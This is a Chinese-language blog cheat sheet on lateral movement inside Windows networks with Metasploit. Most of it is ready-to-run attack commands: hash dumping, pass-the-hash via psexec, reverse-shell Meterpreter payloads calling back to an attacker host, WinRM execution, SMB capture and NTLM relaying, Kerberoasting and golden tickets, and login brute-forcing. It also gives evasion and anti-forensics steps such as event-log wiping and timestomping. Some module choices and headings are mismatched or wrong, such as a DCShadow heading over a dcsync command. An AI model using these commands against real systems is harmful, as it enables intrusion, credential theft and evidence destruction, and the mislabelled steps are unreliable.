---
title: MSF内网横向移动实战
date: 2026-07-23 14:00:00 +0800
categories: [工具速查, MSF利用]
tags: [Metasploit, 横向移动, 内网渗透, Pass-the-Hash]
description: MSF 内网横向移动全攻略，涵盖 Pass-the-Hash、Psexec、WMI、SMB 中继、域信任等内网核心攻击技术。
---

# MSF内网横向移动实战

## 一、横向移动概述

横向移动（Lateral Movement）是内网渗透的核心环节，目标是在已控主机基础上，逐步扩大控制范围，最终获取域控权限。

### 横向移动路径

```
外网入口 → DMZ 主机 → 内网工作站 → 内网服务器 → 域控制器
```

### 常见技术

| 技术 | 协议 | 前提条件 |
|------|------|----------|
| Pass-the-Hash | SMB/RPC | 获取 NTLM Hash |
| Psexec | SMB (445) | 管理员权限 + SMB 开放 |
| WinRM | HTTP/5985 | WinRM 服务开启 |
| WMI | RPC (135) | 管理员权限 + WMI 可用 |
| SMB 中继 | SMB | SMB Signing 未启用 |
| RDP | RDP (3389) | RDP 开放 + 凭据 |

## 二、Pass-the-Hash (PTH)

### 原理

利用 NTLM Hash 明文（无需破解密码）进行 SMB 身份验证，实现远程登录。

### MSF 实现

```bash
# 步骤1：获取目标 NTLM Hash
meterpreter > hashdump
# 获取：admin:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# 步骤2：利用 psexec
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.200
msf6 exploit(windows/smb/psexec) > set SMBDomain WORKGROUP
msf6 exploit(windows/smb/psexec) > set SMBUser admin
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/psexec) > run
```

## 三、Psexec 模块

### 利用条件

- 目标开放 445 端口（SMB）
- 具有目标主机的管理员凭据或 Hash
- 目标允许 admin$ 共享

### 多种凭据形式

```bash
# 明文密码
set SMBPass P@ssw0rd123

# NTLM Hash
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# AES Key（Kerberos）
set SMBPass aes256_key
```

### 自定义 Service Name（规避检测）

```bash
set SERVICE_NAME myservice
set SERVICE_DESCRIPTION My Service
```

## 四、WMI 横向移动

### 利用模块

```bash
msf6 > use exploit/windows/local/wmi
```

### PowerShell 方式

```bash
# 生成 Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o wmi_payload.ps1

# 通过 WMI 远程执行
# 使用 wmic 或 Invoke-WMICommand
```

## 五、WinRM 横向移动

### 利用模块

```bash
msf6 > use exploit/windows/winrm/winrm_script_exec
msf6 exploit(windows/winrm/winrm_script_exec) > set RHOSTS 192.168.1.200
msf6 exploit(windows/winrm/winrm_script_exec) > set USERNAME admin
msf6 exploit(windows/winrm/winrm_script_exec) > set PASSWORD P@ssw0rd
msf6 exploit(windows/winrm/winrm_script_exec) > set FORCE_VBS true
msf6 exploit(windows/winrm/winrm_script_exec) > run
```

## 六、SMB 中继攻击

### 原理

通过中间人方式将目标的 SMB 请求中继到另一台主机，实现无密码横向移动。

### 前提条件

- 目标未启用 SMB Signing
- 存在中间人位置（ARP 欺骗等）

### MSF 实现

```bash
# 开启 SMB 中继服务器
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set SRVHOST 192.168.1.50
msf6 auxiliary(server/capture/smb) > set CAINPWFILE /tmp/cain_smb.txt
msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/john_smb.txt
msf6 auxiliary(server/capture/smb) > run

# 使用 ebtables 或 iptables 转发流量到目标
```

### ntlmrelayx（impacket 配合）

```bash
ntlmrelayx.py -t 192.168.1.200 -smb2support -e payload.exe
```

## 七、域环境横向移动

### 域信任攻击

```bash
# 枚举域信任
msf6 > use post/windows/gather/enum_domain

# Kerberoasting
msf6 > use auxiliary/gather/get_user_spns
```

### 黄金票据 (Golden Ticket)

```bash
meterpreter > load kiwi
meterpreter > golden_ticket_create -u Administrator -d corp.local -k krbtgt_hash -s S-1-5-21-... -t /tmp/golden.ticket
meterpreter > kerberos_ticket_use /tmp/golden.ticket
```

### DCShadow

```bash
# 模拟域控推送恶意对象修改
meterpreter > dcsync_ntlm DC01$
```

## 八、自动化横向移动

### 使用 Empire 配合

```bash
# 生成 Empire 监听器，通过 MSF 传递凭证
```

### MSF 内置辅助

```bash
# 扫描内网 SMB 共享
msf6 > use auxiliary/scanner/smb/smb_enumshares

# 扫描内网 RDP
msf6 > use auxiliary/scanner/rdp/rdp_scanner

# 扫描内网 SSH
msf6 > use auxiliary/scanner/ssh/ssh_login

# 扫描内网数据库
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 > use auxiliary/scanner/mssql/mssql_login
msf6 > use auxiliary/scanner/postgres/postgres_login
```

## 九、反检测与痕迹清理

### 日志清理

```bash
meterpreter > clearev
# 清除 Windows 事件日志（Application, System, Security）
```

### Meterpreter 隐藏

```bash
# 迁移进程
meterpreter > migrate -N explorer.exe

# 修改文件时间戳
meterpreter > timestomp C:\\Windows\\Temp\\payload.exe -c "2020-01-01 12:00:00"
```

### 代理通信

```bash
# 通过已控主机做代理链
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j

# proxychains 配置
# socks5 127.0.0.1 1080
```

## 十、横向移动检查清单

| 步骤 | 操作 | MSF 模块 |
|------|------|----------|
| 1 | 收集内网主机信息 | `post/windows/gather/arp_scanner` |
| 2 | 收集凭据 | `hashdump`, `kiwi` |
| 3 | 枚举域信息 | `post/windows/gather/enum_domain` |
| 4 | 配置路由 | `run autoroute` |
| 5 | PTH 横向 | `exploit/windows/smb/psexec` |
| 6 | 域信任攻击 | `auxiliary/gather/get_user_spns` |
| 7 | 权限维持 | `run persistence` |

---

> 至此，MSF 利用系列五篇文章已全部完成。从环境搭建到横向移动，形成完整的渗透测试流程闭环。
